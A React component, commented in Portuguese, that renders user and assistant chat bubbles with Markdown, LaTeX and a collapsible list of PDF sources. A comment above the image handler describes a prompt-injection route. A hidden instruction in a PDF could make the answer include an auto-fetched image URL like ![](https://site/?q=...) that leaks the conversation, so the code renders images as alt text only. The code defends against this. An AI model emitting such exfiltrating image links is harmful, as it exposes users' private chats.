import { useState } from 'react';
import { Text, UnstyledButton } from '@mantine/core';
import { IconChevronDown, IconChevronUp, IconSparkles } from '@tabler/icons-react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remarkMath from 'remark-math';
import rehypeKatex from 'rehype-katex';
import 'katex/dist/katex.min.css';
import styles from '../../styles/Chats/Chats.module.css';
import { prepararMarkdown } from './prepararMarkdown';

const componentes = {
    a({ href = '', children }) {
        if (href.startsWith('#cite-')) {
            return <span className={styles.cite}>{children}</span>;
        }
        return <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>;
    },
    // a resposta pode vir de um PDF com instrução escondida: uma imagem
    // ![](https://site/?q=...) seria buscada sozinha e vazaria a conversa
    img({ alt }) {
        return alt || null;
    },
};

/**
 * Um balão da conversa. Respostas do assistente vêm em Markdown com LaTeX
 * (KaTeX) e mostram as fontes (trechos dos PDFs) num bloco que abre ao tocar,
 * para funcionar também no celular. HTML vindo do modelo não é interpretado.
 *
 * @param {Object} props
 * @param {'user'|'assistant'} props.papel
 * @param {string} props.msg
 * @param {Array<{n:number, file_name:string, excerpt:string}>} [props.sources]
 */
export default function ChatMessage({ papel, msg, sources = [] }) {
    const [showSources, setShowSources] = useState(false);

    if (papel === 'user') {
        return (
            <div className={styles.rowUser}>
                <div className={styles.bubbleUser}>
                    <Text className={styles.bubbleText}>{msg}</Text>
                </div>
            </div>
        );
    }

    return (
        <div className={styles.rowAssistant}>
            <span className={styles.avatar} aria-hidden="true"><IconSparkles size={16} /></span>
            <div className={styles.bubbleAssistant}>
                <div className={styles.markdown}>
                    <ReactMarkdown
                        remarkPlugins={[remarkGfm, remarkMath]}
                        rehypePlugins={[[rehypeKatex, { maxSize: 10 }]]}
                        components={componentes}
                    >
                        {prepararMarkdown(msg)}
                    </ReactMarkdown>
                </div>

                {sources.length > 0 && (
                    <>
                        <UnstyledButton
                            className={styles.sourcesToggle}
                            onClick={() => setShowSources((v) => !v)}
                            aria-expanded={showSources}
                        >
                            {showSources ? <IconChevronUp size={14} /> : <IconChevronDown size={14} />}
                            {sources.length === 1 ? '1 fonte' : `${sources.length} fontes`}
                        </UnstyledButton>
                        {showSources && (
                            <ol className={styles.sourcesList}>
                                {sources.map((s) => (
                                    <li key={s.n}>
                                        <span className={styles.sourceName}>
                                            <span className={styles.cite}>{s.n}</span>
                                            {s.file_name || 'documento'}
                                        </span>
                                        {s.excerpt && <span className={styles.sourceExcerpt}>{s.excerpt}…</span>}
                                    </li>
                                ))}
                            </ol>
                        )}
                    </>
                )}
            </div>
        </div>
    );
}
